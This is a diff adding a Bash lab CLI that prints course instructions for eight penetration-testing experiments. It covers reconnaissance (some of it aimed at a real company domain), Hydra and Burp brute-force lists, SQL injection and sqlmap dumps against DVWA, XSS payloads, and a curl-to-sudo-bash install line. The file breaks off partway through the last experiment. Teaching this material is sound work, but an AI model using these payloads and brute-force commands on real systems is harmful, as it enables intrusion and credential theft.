@@ -1,0 +1,807 @@
+#!/usr/bin/env bash
+# s7 — Cyber Security Lab CLI (Pure Bash, zero dependencies)
+set -u
+
+DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+ENV_FILE="$DIR/.env"
+CFG="$DIR/.s7config"
+
+[ -f "$ENV_FILE" ] && set -a && source "$ENV_FILE" && set +a
+[ -f "$CFG" ] && source "$CFG"
+
+VERCEL_URL="${VERCEL_URL:-${S7_VERCEL_URL:-}}"
+CF_URL="${CF_URL:-${S7_CF_URL:-}}"
+API_KEY="${API_KEY:-${S7_API_KEY:-${GEMINI_API_KEY:-}}}"
+
+if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
+    B=$'\033[1m' D=$'\033[2m' G=$'\033[32m' C=$'\033[36m' Y=$'\033[33m' M=$'\033[35m' R=$'\033[0m' REV=$'\033[7m'
+else
+    B="" D="" G="" C="" Y="" M="" R="" REV=""
+fi
+
+show_help() {
+    cat <<EOF
+${B}${C}S7 Lab CLI — Usage & Navigation${R}
+
+${B}Start Interactive Menu:${R}
+  ${G}./s7${R}                    Open interactive menu (works on Ubuntu without Python)
+  ${G}.\s7.ps1${R}                Open interactive menu in Windows PowerShell
+
+${B}Direct Terminal Commands:${R}
+  ${G}./s7 <1-8>${R}              Full instructions + commands for Experiment 1–8 (or ${G}p1-p7${R})
+  ${G}./s7 c <1-8>${R}            ${B}Commands-Only mode${R} (only commands & payloads, e.g. ${G}./s7 c 7${R})
+  ${G}./s7 list${R}               List all 8 experiments
+  ${G}./s7 s <keyword>${R}        Search across all experiments (e.g. ${G}./s7 s sqlmap${R})
+  ${G}./s7 ai "<question>"${R}    Ask AI via proxy or free-tier fallback
+  ${G}./s7 cfg${R}                Set Vercel / Cloudflare proxy URLs
+  ${G}./s7 help${R}               Show this help guide
+
+${B}Interactive Keys (Inside Menu & Experiments):${R}
+  ${Y}Up/Down${R} or ${Y}1-8${R}          Select experiment
+  ${Y}c${R}                       Switch current experiment to ${B}Commands-Only${R} view
+  ${Y}f${R}                       Switch current experiment to ${B}Full Instructions${R} view
+  ${Y}n${R} / ${Y}p${R}                   Next / Previous experiment
+  ${Y}s${R}                       Search keyword
+  ${Y}a${R}                       Ask AI a question
+  ${Y}h${R}                       Open Help
+  ${Y}b${R}                       Back to main menu
+  ${Y}q${R}                       Quit
+EOF
+}
+
+# Full Instructions Mode vs Commands-Only Mode ("full" or "cmds")
+show_exp() {
+    local id="$1"
+    local mode="${2:-full}"
+
+    case "$id" in
+        1)
+            printf "%sExp 1: Familiarization of Application Penetration Testing (Theory)%s\n" "$B$C" "$R"
+            if [ "$mode" = "cmds" ]; then
+                printf "\n%s# Passive Recon Tools%s\n%stheHarvester, Maltego, Recon-ng, Shodan%s\n" "$D" "$R" "$G" "$R"
+                printf "\n%s# Active Recon Tools%s\n%sNmap, Burp Suite, OWASP ZAP, Nikto, DirBuster, Gobuster, FFUF%s\n" "$D" "$R" "$G" "$R"
+                return
+            fi
+            cat <<EOF
+${Y}Aim:${R} Familiarize with application penetration testing concepts, recon tools, and ethical rules.
+
+${M}1. Application Penetration Testing${R}
+   - Evaluates security of web/mobile apps by simulating real-world attacks.
+   - Identifies insecure coding, misconfigurations, authentication flaws, and data leaks.
+
+${M}2. Passive vs Active Reconnaissance${R}
+   - Passive Recon: Gather info without directly touching the target (search engines, WHOIS, Shodan, breach DBs).
+     Tools: ${G}theHarvester, Maltego, Recon-ng, Shodan${R}
+   - Active Recon: Directly probe the target to find open ports, services, and directories.
+     Tools: ${G}Nmap, Burp Suite, Nikto, DirBuster, Gobuster, FFUF${R}
+
+${M}3. Ethical Considerations${R}
+   - Obtain written authorization from the owner before testing.
+   - Stay strictly within agreed scope; avoid data loss or service disruption.
+   - Report all vulnerabilities responsibly.
+EOF
+            ;;
+
+        2)
+            printf "%sExp 2 (Practical 1): Reconnaissance & Info Gathering Using Recon-ng%s\n" "$B$C" "$R"
+            if [ "$mode" = "cmds" ]; then
+                cat <<EOF
+
+${D}# Step 1: Install & start recon-ng (Ubuntu / Kali)${R}
+${G}sudo apt update && sudo apt install -y recon-ng${R}
+${G}recon-ng${R}
+${D}# Ubuntu git clone fallback if apt package is unavailable:${R}
+${G}git clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS && ./recon-ng${R}
+
+${D}# Step 2: Create workspace (inside recon-ng)${R}
+${G}workspaces create testspace${R}
+${G}workspaces select testspace${R}
+
+${D}# Step 3: Install modules${R}
+${G}marketplace search${R}
+${G}marketplace install recon/domains-hosts/hackertarget${R}
+${G}marketplace install recon/domains-contacts/whois_pocs${R}
+${G}marketplace install recon/domains-hosts/brute_hosts${R}
+${G}marketplace install recon/domains-hosts/bing_domain_web${R}
+
+${D}# Step 4: Subdomain discovery (HackerTarget)${R}
+${G}modules load recon/domains-hosts/hackertarget${R}
+${G}options set SOURCE tesla.com${R}
+${G}run${R}
+
+${D}# Step 5: WHOIS Point of Contact (PoC)${R}
+${G}modules load recon/domains-contacts/whois_pocs${R}
+${G}options set SOURCE tesla.com${R}
+${G}run${R}
+
+${D}# Step 6: Brute-force subdomains${R}
+${G}modules load recon/domains-hosts/brute_hosts${R}
+${G}options set SOURCE tesla.com${R}
+${G}run${R}
+
+${D}# Step 7: Bing search subdomains & view results${R}
+${G}modules load recon/domains-hosts/bing_domain_web${R}
+${G}options set SOURCE tesla.com${R}
+${G}run${R}
+${G}show hosts${R}
+${G}show contacts${R}
+EOF
+                return
+            fi
+            cat <<EOF
+${Y}Aim:${R} Gather public OSINT on tesla.com using Recon-ng (subdomains, WHOIS PoC, brute-force, Bing).
+${Y}Target:${R} tesla.com   |   ${Y}Tool:${R} Recon-ng
+
+${M}Step 1: Install & Launch Recon-ng${R}
+  Open terminal and install via APT (or clone from GitHub if not in Ubuntu repo):
+  ${G}sudo apt update && sudo apt install -y recon-ng${R}
+  ${G}recon-ng${R}
+  ${D}# Fallback: git clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && ./recon-ng${R}
+
+${M}Step 2: Create & Select a Workspace${R}
+  Workspaces isolate reconnaissance data for each target:
+  ${G}workspaces create testspace${R}
+  ${G}workspaces select testspace${R}
+
+${M}Step 3: Search & Install Required Marketplace Modules${R}
+  Install the 4 OSINT modules used in the experiment:
+  ${G}marketplace search${R}
+  ${G}marketplace install recon/domains-hosts/hackertarget${R}
+  ${G}marketplace install recon/domains-contacts/whois_pocs${R}
+  ${G}marketplace install recon/domains-hosts/brute_hosts${R}
+  ${G}marketplace install recon/domains-hosts/bing_domain_web${R}
+
+${M}Step 4: Subdomain Discovery via HackerTarget${R}
+  Enumerates subdomains using HackerTarget's public data:
+  ${G}modules load recon/domains-hosts/hackertarget${R}
+  ${G}options set SOURCE tesla.com${R}
+  ${G}run${R}
+
+${M}Step 5: WHOIS Contact Information${R}
+  Extracts public Point of Contact (PoC) admin/tech emails from WHOIS:
+  ${G}modules load recon/domains-contacts/whois_pocs${R}
+  ${G}options set SOURCE tesla.com${R}
+  ${G}run${R}
+
+${M}Step 6: Brute-Force Subdomain Discovery${R}
+  Brute-forces common subdomain names:
+  ${G}modules load recon/domains-hosts/brute_hosts${R}
+  ${G}options set SOURCE tesla.com${R}
+  ${G}run${R}
+
+${M}Step 7: Subdomain Discovery via Bing Search${R}
+  Finds additional indexed subdomains via Bing and displays collected tables:
+  ${G}modules load recon/domains-hosts/bing_domain_web${R}
+  ${G}options set SOURCE tesla.com${R}
+  ${G}run${R}
+  ${G}show hosts${R}
+  ${G}show contacts${R}
+
+${Y}Observations:${R}
+  - hackertarget and bing_domain_web revealed multiple subdomains of tesla.com.
+  - whois_pocs extracted public WHOIS admin/tech contact details.
+  - brute_hosts discovered predictable subdomains via DNS brute-forcing.
+EOF
+            ;;
+
+        3)
+            printf "%sExp 3 (Practical 2): Network Footprinting & Enumeration (Maltego, Nmap, Gobuster, FFUF)%s\n" "$B$C" "$R"
+            if [ "$mode" = "cmds" ]; then
+                cat <<EOF
+
+${D}# Ubuntu setup & wordlist${R}
+${G}sudo apt update && sudo apt install -y nmap gobuster ffuf dirb curl${R}
+${G}sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt${R}
+
+${D}# 1. Maltego${R}
+${G}maltego${R}
+
+${D}# 2. Nmap scans${R}
+${G}sudo nmap -sn <Target-IP>/24${R}
+${G}sudo nmap -sV -O -p- -A -T4 <TARGET-IP>${R}
+${G}sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com${R}
+${G}sudo nmap -F testphp.vulnweb.com${R}
+
+${D}# 3. Gobuster directory enumeration${R}
+${G}gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt${R}
+${G}gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt${R}
+
+${D}# 4. FFUF directory enumeration${R}
+${G}ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt${R}
+EOF
+                return
+            fi
+            cat <<EOF
+${Y}Aim:${R} Perform passive and active reconnaissance to identify live hosts, open ports, services, and hidden directories.
+${Y}Tools:${R} Maltego, Nmap, Gobuster, FFUF, curl   |   ${Y}Target:${R} testphp.vulnweb.com / <Lab-IP>
+
+${M}Step 0: Ubuntu Tool & Wordlist Setup${R}
+  Ensure Nmap, Gobuster, FFUF, and the dirb common.txt wordlist are installed:
+  ${G}sudo apt update && sudo apt install -y nmap gobuster ffuf dirb curl${R}
+  ${G}sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt${R}
+
+${M}Step 1: Passive Reconnaissance using Maltego${R}
+  - Launch Maltego in terminal: ${G}maltego${R}
+  - Log in -> Go to ${B}Machines > Run Machine${R} -> Select ${B}Footprint L1${R}.
+  - Enter target domain: ${G}testphp.vulnweb.com${R} to map IPs, DNS records, emails, and relationships.
+
+${M}Step 2: Active Reconnaissance & Scanning using Nmap${R}
+  Key Flags:
+    ${Y}-sn${R} : Ping scan (host discovery)      ${Y}-sV${R} : Detect service versions
+    ${Y}-p${R}  : Scan specific ports             ${Y}-p-${R} : Scan all 65535 ports
+    ${Y}-A${R}  : Aggressive (OS+version+scripts) ${Y}-Pn${R} : Skip host discovery (treat as online)
+    ${Y}-T4${R} : Faster scanning speed           ${Y}-O${R}  : OS detection
+    ${Y}-F${R}  : Fast scan (top 100 ports)
+
+  a) Discover live hosts on subnet:
+     ${G}sudo nmap -sn <Target-IP>/24${R}
+  b) Perform full port, service & OS scan on target:
+     ${G}sudo nmap -sV -O -p- -A -T4 <TARGET-IP>${R}
+  c) Practice scan against testphp.vulnweb.com:
+     ${G}sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com${R}
+  d) Fast scan (top 100 ports):
+     ${G}sudo nmap -F testphp.vulnweb.com${R}
+
+${M}Step 3: Web Directory Enumeration with Gobuster${R}
+  Brute-forces unlinked web directories (e.g. /admin, /images) using a wordlist:
+  ${G}gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt${R}
+  ${G}gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt${R}
+
+${M}Step 4: Alternative Directory Enumeration using FFUF${R}
+  Replaces the FUZZ keyword with entries from common.txt:
+  ${G}ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt${R}
+
+${Y}Observations:${R}
+  - Maltego collected external infrastructure OSINT without touching the target.
+  - Nmap revealed open ports, service versions, and OS details.
+  - Gobuster and FFUF discovered hidden directories (/admin, /images, /uploads).
+EOF
+            ;;
+
+        4)
+            printf "%sExp 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure%s\n" "$B$C" "$R"
+            if [ "$mode" = "cmds" ]; then
+                cat <<EOF
+
+${D}# Ubuntu setup${R}
+${G}sudo apt update && sudo apt install -y dnsutils dnsrecon theharvester${R}
+${G}curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt${R}
+
+${D}# Step 1: DNSRecon${R}
+${G}dnsrecon -d tesla.com${R}
+${G}dnsrecon -d tesla.com -t std --xml tesla_dns.xml${R}
+${G}dnsrecon -d tesla.com -t brt -D subdomains.txt${R}
+
+${D}# Step 2: theHarvester${R}
+${G}theHarvester -d tesla.com -b bing${R}
+
+${D}# Step 3: Dig queries${R}
+${G}dig tesla.com${R}
+${G}dig +short NS tesla.com${R}
+${G}dig +short MX tesla.com${R}
+
+${D}# Step 4: Google Dorks (run in browser)${R}
+${G}inurl:admin site:tesla.com${R}
+${G}intitle:"login" site:tesla.com${R}
+${G}inurl:login site:testphp.vulnweb.com${R}
+${G}filetype:php inurl:admin${R}
+${G}site:github.com inurl:login${R}
+EOF
+                return
+            fi
+            cat <<EOF
+${Y}Aim:${R} Identify subdomains, email accounts, DNS/MX records, and public login portals using OSINT tools.
+${Y}Tools:${R} DNSRecon, theHarvester, Dig, Google Dorking   |   ${Y}Target:${R} tesla.com / testphp.vulnweb.com
+
+${M}Step 0: Ubuntu Setup${R}
+  ${G}sudo apt update && sudo apt install -y dnsutils dnsrecon theharvester${R}
+  ${G}curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt${R}
+
+${M}Step 1: DNS Enumeration using DNSRecon${R}
+  Look for NS (Name Server), A (IPv4), MX (Mail Exchange), SOA (Start of Authority), and TXT/SPF records:
+  ${G}dnsrecon -d tesla.com${R}
+  ${G}dnsrecon -d tesla.com -t std --xml tesla_dns.xml${R}
+  ${G}dnsrecon -d tesla.com -t brt -D subdomains.txt${R}
+
+${M}Step 2: Subdomain & Email Enumeration using theHarvester${R}
+  Queries public search engines (bing, baidu, yahoo, crtsh) for emails and subdomains:
+  ${G}theHarvester -d tesla.com -b bing${R}
+
+${M}Step 3: DNS Record Query using Dig${R}
+  Manually query A, authoritative NS, and MX mail servers:
+  ${G}dig tesla.com${R}
+  ${G}dig +short NS tesla.com${R}
+  ${G}dig +short MX tesla.com${R}
+
+${M}Step 4: Discovering Login Interfaces using Google Dorking${R}
+  Operators: ${Y}inurl:${R} (URL keyword), ${Y}intitle:${R} (page title), ${Y}filetype:${R} (extension), ${Y}site:${R} (domain), ${Y}intext:${R} (content).
+  Run in Google Search:
+  ${G}inurl:admin site:tesla.com${R}
+  ${G}intitle:"login" site:tesla.com${R}
+  ${G}inurl:login site:testphp.vulnweb.com${R}
+  ${G}filetype:php inurl:admin${R}
+  ${G}site:github.com inurl:login${R}
+
+${Y}Observations:${R}
+  - Discovered subdomains (shop.tesla.com, energy.tesla.com) via theHarvester and DNSRecon.
+  - Dig and DNSRecon mapped authoritative NS and MX email routing records.
+  - Google dorks located login portals on testphp.vulnweb.com.
+EOF
+            ;;
+
+        5)
+            printf "%sExp 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra%s\n" "$B$C" "$R"
+            if [ "$mode" = "cmds" ]; then
+                cat <<EOF
+
+${D}# Ubuntu setup${R}
+${G}sudo apt update && sudo apt install -y hydra ruby-full build-essential libcurl4-openssl-dev libxml2-dev libxslt1-dev${R}
+${G}sudo gem install wpscan && sudo snap install zaproxy --classic${R}
+${G}curl -sL https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt${R}
+
+${D}# Step 1: WPScan (u=users, vp=vuln plugins, vt=vuln themes)${R}
+${G}wpscan --url http://<target-ip> --enumerate u,vp,vt${R}
+
+${D}# Step 2: Launch OWASP ZAP (set browser proxy to 127.0.0.1:8080)${R}
+${G}zaproxy &${R}
+
+${D}# Step 3: Hydra WordPress login brute-force${R}
+${G}sort fsocity.dic | uniq > fsocity.dic.uniq${R}
+${G}hydra -L rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'${R}
+${G}hydra -l elliot -P rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'${R}
+EOF
+                return
+            fi
+            cat <<EOF
+${Y}Aim:${R} Identify vulnerabilities, misconfigurations, CVEs, and weak credentials using WPScan, ZAP, NVD, and Hydra.
+${Y}Tools:${R} WPScan, OWASP ZAP, Hydra, NVD (https://nvd.nist.gov/)
+
+${M}Core Definitions:${R}
+  - ${B}NVD${R} : U.S. government repository of CVEs with CVSS severity scores and mitigation details.
+  - ${B}CVE${R} : Unique vulnerability identifier (e.g., CVE-2024-12345).
+  - ${B}CWE${R} : Software flaw category (e.g., CWE-79 = XSS, CWE-89 = SQL Injection).
+
+${M}Step 0: Ubuntu Setup${R}
+  ${G}sudo apt update && sudo apt install -y hydra ruby-full build-essential libcurl4-openssl-dev libxml2-dev libxslt1-dev${R}
+  ${G}sudo gem install wpscan && sudo snap install zaproxy --classic${R}
+  ${G}curl -sL https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt${R}
+
+${M}Step 1: Scan WordPress for Vulnerabilities using WPScan${R}
+  Flags: ${Y}u${R} = usernames, ${Y}vp${R} = vulnerable plugins, ${Y}vt${R} = vulnerable themes.
+  ${G}wpscan --url http://<target-ip> --enumerate u,vp,vt${R}
+
+${M}Step 2: Validate Discovered Issues using NVD${R}
+  - Open https://nvd.nist.gov/ and search the plugin/theme CVEs reported by WPScan.
+  - Record the CVSS severity score, description, and fix status.
+
+${M}Step 3: Perform Active & Passive Scanning with OWASP ZAP${R}
+  - Launch ZAP: ${G}zaproxy &${R}
+  - Set browser proxy to ${G}127.0.0.1:8080${R} and browse the target site.
+  - Run ${B}Traditional Spider${R} (HTML links) and ${B}AJAX Spider${R} (JS-rendered pages).
+  - Review Passive Scan alerts, then run ${B}Active Scan${R} (checks XSS, SQLi, missing headers, insecure cookies).
+
+${M}Step 4: Brute-Force WordPress Login with Hydra${R}
+  Deduplicate wordlist if needed, then brute-force /wp-login.php:
+  ${G}sort fsocity.dic | uniq > fsocity.dic.uniq${R}
+  1) Enumerate valid username:
+     ${G}hydra -L rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'${R}
+  2) Brute-force password for user 'elliot':
+     ${G}hydra -l elliot -P rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'${R}
+
+${Y}Observations:${R}
+  - WPScan identified outdated plugins and valid usernames.
+  - NVD confirmed CVE severity scores and CWE categories.
+  - ZAP detected missing security headers and XSS vectors; Hydra cracked the login credentials.
+EOF
+            ;;
+
+        6)
+            printf "%sExp 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop%s\n" "$B$C" "$R"
+            if [ "$mode" = "cmds" ]; then
+                cat <<EOF
+
+${D}# Launch Juice Shop on http://127.0.0.1:42000 (Ubuntu Docker or Kali APT)${R}
+${G}sudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop${R}
+${G}sudo apt update && sudo apt install -y juice-shop && sudo juice-shop${R}
+
+${D}# Firefox localhost proxy fix for Burp Suite (127.0.0.1:8080)${R}
+${G}about:config -> network.proxy.allow_hijacking_localhost = true${R}
+
+${D}# Burp Intruder Position Format (Cluster Bomb)${R}
+${G}username=§USERNAME§&password=§PASSWORD§${R}
+${D}# (or in JSON body: {"email":"§USER§","password":"§PASS§"} — uncheck '.' in Payload Encoding)${R}
+
+${D}# Payload Set 1 (Usernames)${R}
+${G}admin@juice-sh.op${R}
+${G}administrator@juice-sh.op${R}
+${G}root@juice-sh.op${R}
+${G}user@juice-sh.op${R}
+${G}test@juice-sh.op${R}
+${G}guest@juice-sh.op${R}
+${G}manager@juice-sh.op${R}
+${G}support@juice-sh.op${R}
+${G}security@juice-sh.op${R}
+
+${D}# Payload Set 2 (Passwords)${R}
+${G}admin${R}
+${G}password${R}
+${G}123456${R}
+${G}juice${R}
+${G}welcome${R}
+${G}admin123${R}
+
+${D}# Jim's Forgot Password Reset (Star Trek OSINT)${R}
+${G}Email: jim@juice-sh.op${R}
+${G}Security Answer: Samuel${R}
+EOF
+                return
+            fi
+            cat <<EOF
+${Y}Aim:${R} Evaluate authentication, authorization, account enumeration, default credentials, brute-force, lockout, cache, and password reset flaws in OWASP Juice Shop.
+${Y}Tools:${R} OWASP Juice Shop, Burp Suite, Firefox   |   ${Y}Target:${R} http://127.0.0.1:42000
+
+${M}Environment Setup & Burp Localhost Fix${R}
+  1. Launch Juice Shop:
+     - Ubuntu (Docker): ${G}sudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop${R}
+     - Kali (APT):      ${G}sudo apt update && sudo apt install -y juice-shop && sudo juice-shop${R}
+  2. Set Burp Suite proxy listener on ${G}127.0.0.1:8080${R} and configure Firefox manual proxy.
+  3. If Burp does not capture localhost traffic in Firefox:
+     - Open ${G}about:config${R} in Firefox -> Accept risk.
+     - Search ${G}network.proxy.allow_hijacking_localhost${R} and toggle it from ${D}false${R} to ${G}true${R}.
+
+${M}Step 1 & 2: Role Definitions, Registration & Account Enumeration${R}
+  - Log in as a normal user and try visiting ${G}/#/administration${R} (verify 403 Forbidden).
+  - Test user registration with invalid emails, short passwords, and special characters.
+  - Check product reviews (e.g. Green Smoothie) to harvest exposed user emails (${G}jim@juice-sh.op${R}, ${G}admin@juice-sh.op${R}).
+
+${M}Step 3: Default Credentials & Brute-Force with Burp Intruder (Cluster Bomb)${R}
+  1. Intercept a login POST request in Burp Proxy -> Right-click -> ${B}Send to Intruder${R}.
+  2. Click ${B}Clear §${R}, then highlight username/email and password and click ${B}Add §${R}:
+     ${G}username=§USERNAME§&password=§PASSWORD§${R}   (or JSON: ${G}{"email":"§USER§","password":"§PASS§"}${R})
+  3. Set Attack Type to ${B}Cluster Bomb${R} (or ${B}Sniper${R} with username fixed to ${G}admin@juice-sh.op${R}).
+  4. In ${B}Payloads${R} tab -> scroll down to ${B}Payload Encoding${R} -> remove ${G}.${R} (dot) from URL-encoded characters.
+  5. Load Payloads:
+     - ${Y}Payload Set 1 (Usernames):${R}
+       ${G}admin@juice-sh.op, administrator@juice-sh.op, root@juice-sh.op, user@juice-sh.op, test@juice-sh.op, guest@juice-sh.op, manager@juice-sh.op, support@juice-sh.op, security@juice-sh.op${R}
+     - ${Y}Payload Set 2 (Passwords):${R}
+       ${G}admin, password, 123456, juice, welcome, admin123${R}
+  6. Click ${B}Start Attack${R} -> Look for ${G}HTTP 200 OK${R} and distinct response length (${G}admin@juice-sh.op : admin123${R}).
+
+${M}Step 4: Weak Lockout, Browser Cache & Weak Password Reset (OSINT)${R}
+  - ${B}Weak Lockout:${R} Enter wrong password 10+ times in a row -> observe no account lockout or CAPTCHA.
+  - ${B}Browser Cache:${R} Log in -> view Profile/Order History -> Log out -> press Browser Back button to check if private data remains visible.
+  - ${B}Password Reset (Jim):${R}
+    - Green Smoothie review by Jim mentions "replicator" (from Star Trek -> Captain James T. Kirk).
+    - On Forgot Password page for ${G}jim@juice-sh.op${R}, security question asks "Your eldest brother's middle name?".
+    - Enter ${G}Samuel${R} (George Samuel Kirk) and reset Jim's password.
+EOF
+            ;;
+
+        7)
+            printf "%sExp 7 (Practical 6): SQL Injection & Blind SQL Injection in DVWA%s\n" "$B$C" "$R"
+            if [ "$mode" = "cmds" ]; then
+                cat <<EOF
+
+${D}# Step 1: Install DVWA & SQLMap (Ubuntu / Kali)${R}
+${G}sudo apt update && sudo apt install -y sqlmap curl${R}
+${G}sudo bash -c "\$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"${R}
+${G}sudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa${R}
+
+${D}# Part A: Classic SQLi Payloads (DVWA -> SQL Injection)${R}
+${G}1'${R}
+${G}1' AND 1=2 #${R}
+${G}1' OR '1'='1${R}
+${G}1' UNION SELECT null, version() #${R}
+${G}1' UNION SELECT null, table_name FROM information_schema.tables #${R}
+${G}1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #${R}
+${G}1' UNION SELECT user, password FROM users #${R}
+
+${D}# Part B: Manual Blind SQLi Payloads (DVWA -> SQL Injection (Blind))${R}
+${G}1'${R}
+${G}1' AND 1=1 #${R}
+${G}1' AND 1=2 #${R}
+${G}1' AND SUBSTRING(database(),1,1)='d' #${R}
+
+${D}# Part B: Automated Blind SQLi with SQLMap (Replace YOUR_COOKIE with PHPSESSID)${R}
+${G}sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" --dbs --batch${R}
+${G}sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -p id -D dvwa --tables --batch --threads 5${R}
+${G}sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -D dvwa -T users --dump --batch --threads 5${R}
+EOF
+                return
+            fi
+            cat <<EOF
+${Y}Aim:${R} Demonstrate Classic SQLi and Blind SQLi in DVWA (Low Security) using manual payloads and SQLMap.
+${Y}Target:${R} http://localhost/DVWA   |   ${Y}Default Login:${R} admin / password   |   ${Y}Security:${R} Low
+
+${M}Step 1–4: Install & Configure DVWA${R}
+  1. Install DVWA & SQLMap:
+     ${G}sudo apt update && sudo apt install -y sqlmap curl${R}
+     ${G}sudo bash -c "\$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"${R}
+     ${D}# Or Docker on Ubuntu: sudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa${R}
+  2. Open ${G}http://localhost/DVWA${R} -> Log in with ${G}admin${R} / ${G}password${R}.
+  3. Click ${B}Create / Reset Database${R}, log back in, go to ${B}DVWA Security${R} -> set to ${B}Low${R} -> Submit.
+
+${M}Part A: Classic SQL Injection (Vulnerabilities -> SQL Injection)${R}
+  Step 5 — Trigger SQL error to confirm vulnerability:
+    ${G}1'${R}
+  Step 6 — Bypass authentication / display all users:
+    ${G}1' AND 1=2 #${R}
+    ${G}1' OR '1'='1${R}
+  Step 7 — Extract database version via UNION:
+    ${G}1' UNION SELECT null, version() #${R}
+  Step 8 — Enumerate database tables & columns of 'users' table:
+    ${G}1' UNION SELECT null, table_name FROM information_schema.tables #${R}
+    ${G}1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #${R}
+    ${G}1' UNION SELECT user, password FROM users #${R}
+
+${M}Part B: Blind SQL Injection (Vulnerabilities -> SQL Injection (Blind))${R}
+  Step 10 — Test parameter handling (returns generic exists/missing message, no syntax error):
+    ${G}1'${R}
+  Step 11 — Boolean-based test (True vs False response):
+    ${G}1' AND 1=1 #${R}   ${D}(Condition True -> User ID exists)${R}
+    ${G}1' AND 1=2 #${R}   ${D}(Condition False -> User ID is MISSING)${R}
+  Step 12 — Extract database name character by character (checks if 1st char is 'd' for 'dvwa'):
+    ${G}1' AND SUBSTRING(database(),1,1)='d' #${R}
+
+${M}Step 13 & 14: Automate Blind SQLi with SQLMap${R}
+  Capture your ${Y}PHPSESSID${R} cookie from Burp Suite or Browser DevTools (F12 -> Storage/Application -> Cookies):
+  1) List databases (${Y}--dbs${R}):
+     ${G}sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" --dbs --batch${R}
+  2) List tables in dvwa (${Y}-D dvwa --tables${R}):
+     ${G}sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -p id -D dvwa --tables --batch --threads 5${R}
+  3) Dump users table & crack MD5 password hashes (${Y}-T users --dump${R}):
+     ${G}sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -D dvwa -T users --dump --batch --threads 5${R}
+
+${Y}Observations:${R}
+  - Classic SQLi extracted database version, table names, and user records via UNION SELECT.
+  - Blind SQLi confirmed boolean behavior and SQLMap cracked MD5 hashes (admin:password, gordonb:abc123).
+EOF
+            ;;
+
+        8)
+            printf "%sExp 8 (Practical 7): Client-Side Testing (HTML Injection & XSS in DVWA)%s\n" "$B$C" "$R"
+            if [ "$mode" = "cmds" ]; then
+                cat <<EOF
+
+${D}# Step 2: HTML Injection (DVWA -> XSS (Stored))${R}
+${G}<h1>Website Defaced by Student</h1>${R}
+
+${D}# Step 3: JavaScript Execution & Cookie Theft (DVWA -> XSS (Stored))${R}
+${G}<script>alert('JavaScript Executed!')</script>${R}
+${G}<script>alert('Cookies: ' + document.cookie)</script>${R}
+
+${D}# Step 4: Reflected XSS (DVWA -> XSS (Reflected))${R}
+${G}<button onclick="alert('1')">Click Me!</button>${R}
+
+${D}# Step 5: DOM-Based XSS (DVWA -> XSS (DOM) URL bar)${R}
+${G}http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>${R}
+
+${D}# Step 6: Stored XSS (Compact Event Handler) & Alternative Filter-Bypass Payloads${R}
+${G}<div onmouseover=alert(1)>Hover</div>${R}
+${G}<img src=x onmouseover=alert('XSS')>${R}
+${G}<img src=invalidImage onerror=alert('XSS')>${R}
